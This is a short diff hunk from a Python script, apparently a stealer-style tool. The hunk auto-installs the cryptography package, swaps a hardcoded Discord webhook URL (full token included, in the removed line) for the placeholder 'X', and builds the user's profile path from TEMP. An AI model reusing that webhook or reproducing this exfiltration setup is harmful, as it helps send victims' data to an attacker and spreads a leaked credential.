@@ -39,7 +39,7 @@ except:
     os.system("pip install cryptography")
 
 
-Webhook_Here = "https://discord.com/api/webhooks/1036195097806651462/IiWkvmx0oM1deBXxfw_6KikmznXjwmq2aSxppow5w36YYz9RUkiGl1N-JDhCLHA6o5_B"
+Webhook_Here = "X"
 
 temp = os.getenv('TEMP')
 user = temp.split("\AppData")[0] 
